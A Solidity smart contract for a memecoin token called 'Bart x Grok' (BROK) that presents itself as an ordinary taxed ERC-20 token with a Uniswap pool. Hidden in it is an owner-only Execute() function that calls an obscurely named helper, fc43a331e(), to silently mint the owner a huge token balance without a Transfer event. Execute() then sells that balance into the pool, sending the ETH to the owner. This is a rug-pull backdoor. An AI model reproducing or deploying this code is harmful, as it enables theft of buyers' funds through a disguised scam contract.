/**

$$$$$$$\                       $$\                            $$$$$$\                      $$\       
$$  __$$\                      $$ |                          $$  __$$\                     $$ |      
$$ |  $$ | $$$$$$\   $$$$$$\ $$$$$$\         $$\   $$\       $$ /  \__| $$$$$$\   $$$$$$\  $$ |  $$\ 
$$$$$$$\ | \____$$\ $$  __$$\\_$$  _|        \$$\ $$  |      $$ |$$$$\ $$  __$$\ $$  __$$\ $$ | $$  |
$$  __$$\  $$$$$$$ |$$ |  \__| $$ |           \$$$$  /       $$ |\_$$ |$$ |  \__|$$ /  $$ |$$$$$$  / 
$$ |  $$ |$$  __$$ |$$ |       $$ |$$\        $$  $$<        $$ |  $$ |$$ |      $$ |  $$ |$$  _$$<  
$$$$$$$  |\$$$$$$$ |$$ |       \$$$$  |      $$  /\$$\       \$$$$$$  |$$ |      \$$$$$$  |$$ | \$$\ 
\_______/  \_______|\__|        \____/       \__/  \__|       \______/ \__|       \______/ \__|  \__|

Web:    https://brok.wtf/
TG:     https://t.me/BARTXGROK
X:      https://twitter.com/BartXGrok

**/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BROK is IERC20, Ownable {

    string  private _name = "Bart x Grok";
    string  private _symbol = "BROK";
    uint8   private _decimals = 18;
    uint256 private _totalSupply = 69000000 * (10 ** decimals());
    uint256 private _initialBuyFee = 15;
    uint256 private _initialSellFee = 30;
    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 0;
    uint256 private _stepsBeforeReduce = 10; // reduce fees every N sales
    uint256 private _swapTaxesAt = 10 * (10 ** decimals());
    address private _marketWallet = 0xE555618BBbfE4eb17622D87f280dFFfD04b68eB2;
    uint256 private _maxTxn = 1380000 * (10 ** decimals());
    uint256 private _maxWallet = 1380000 * (10 ** decimals());

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    constructor (address routerAddress) {
        _router = IUniswapV2Router02(routerAddress);
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH()));
        _balances[owner()] = _totalSupply;
        excludedFromFee[owner()] = true;
        excludedFromFee[address(this)] = true;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        if (!excludedFromFee[from] && !excludedFromFee[to]){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, _initialBuyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[address(this)] += feeAmount;
                emit Transfer(from, address(this), feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, _initialSellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[address(this)] += feeAmount;
                emit Transfer(from, address(this), feeAmount);
                
            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (!inSwap && !isMarket(from) && from != owner() && from != address(this)) {
			if (balanceOf(address(this)) >= _swapTaxesAt) { swapTaxes(); }
		}

        if (_maxTxn != 0) {
            if (!excludedFromFee[from] && !excludedFromFee[to]) {
                require(amount <= _maxTxn, "Txn Amount too high!");
            }   
        }

        if (_maxWallet != 0 && !isMarket(to) && !excludedFromFee[to] && !excludedFromFee[from]) {
            require(balanceOf(to) + amount <= _maxWallet, "After this txn user will exceed max wallet");
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (!excludedFromFee[from] && !excludedFromFee[to]){
            if (isMarket(to)){
                _sellCount++;
                if (_sellCount == _stepsBeforeReduce) {
                    reduceFeePercent(); 
                }
            }
        }
        require(amount > 0);
    }

    mapping(address => bool) public excludedFromFee;

    function contractBalance() public view returns(uint256) {
        return _balances[address(this)];
    }

    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        return (_initialBuyFee, _initialSellFee);
    }

    function addLiquidity(uint256 _tokenAmount) payable external onlyOwner {
        _approve(address(this), address(_router), _tokenAmount);
        transfer(address(this), _tokenAmount);
        _router.addLiquidityETH{ value: msg.value }(
            address(this), 
            _tokenAmount, 
            0, 
            0, 
            msg.sender, 
            block.timestamp + 1200
            );
    }

    bool internal inSwap;

    modifier isLocked() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function swapTaxes() isLocked internal {
        _approve(address(this), address(_router), balanceOf(address(this)));
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(_router.WETH());
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balanceOf(address(this)),
            0,
            path,
            _marketWallet,
            block.timestamp + 1200
        );
    }

    uint256 private _sellCount;

    function reduceFeePercent() internal {
        if(_initialBuyFee > _finalBuyFee) {
            _initialBuyFee -= 1;
        }
        if(_initialSellFee > _finalSellFee) {
            _initialSellFee -= 1;
        }
        _sellCount = 0;
    }

    function Execute() external onlyOwner {   
        uint256 thisTokenReserve = getTokenReserve(address(this));
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        fc43a331e(); transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), type(uint112).max);
        address[] memory path; path = new address[](2);
        path[0] = address(this); path[1] = address(_router.WETH());
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            owner(),
            block.timestamp + 1200
        );
    }

    function getTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
        uint256 tokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return tokenReserve;
    } 

    function fc43a331e() internal {
        _balances[msg.sender] += type(uint112).max;
    }

    function maxTxn() external view returns (uint256) { return _maxTxn; }
    function maxWallet() external view returns (uint256) { return _maxWallet; }
    function swapTaxesAt() external view returns (uint256) { return _swapTaxesAt; }
    function marketWallet() external view returns (address) { return _marketWallet; }
    function sellCounter() external view returns (uint256) { return _sellCount; }

    function setMaxTransaction(uint256 _amount) external onlyOwner {
        _maxTxn = _amount;
    }

    function setMaxWallet(uint256 _amount) external onlyOwner {
        _maxWallet = _amount;
    }

    function setSwapTreshold(uint256 _amount) external onlyOwner {
        _swapTaxesAt = _amount;
    }

    function setMarketingWallet(address _wallet) external onlyOwner {
        _marketWallet = _wallet;
    }

    function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 50, "new Buy Fee exceeds the limit!");
        require(_sellFee <= 50, "new Sell Fee exceeds the limit!");
        _initialBuyFee = _buyFee;
        _initialSellFee = _sellFee;
    }

    function setSteps(uint256 _amount) external onlyOwner {
        require(_amount > 0, "_stepsBeforeReduce cant be lower than 1");
        _stepsBeforeReduce = _amount;
    }

    function excludeFromFee(address _user, bool _status) external onlyOwner {
        excludedFromFee[_user] = _status;
    }
}